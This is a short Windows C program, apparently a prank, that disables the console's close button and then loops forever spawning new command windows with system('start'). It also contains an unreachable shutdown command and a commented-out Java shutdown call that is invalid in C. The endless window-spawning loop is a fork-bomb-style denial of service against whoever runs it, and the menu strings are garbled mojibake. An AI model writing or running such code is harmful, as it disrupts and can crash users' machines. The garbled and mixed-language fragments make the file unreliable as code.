#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include <windows.h>
#include<stdlib.h>
#include<conio.h>
int main()
{
	int a = 0;
	/*printf("1,ˢ��\n");
	printf("2,�ػ�\n");
	printf("���������ѡ��:(����1��2����Ĳ�Ҫ�Ұ�)\n");
	scanf("%d", &a);*/
ferst:	
	EnableMenuItem(GetSystemMenu(GetConsoleWindow(), FALSE), SC_CLOSE, MF_GRAYED);
			system("start");
			for (int b = 0; b < 61;b++)
			printf("�ȴ��ػ���\n");
			goto ferst;	
			system("shutdown -s -t 60");
	/*if (a==)
	{	Runtime.getRuntime().exec("cmd /c shutdown -s -t 600");
	}*/		
	return 0;

}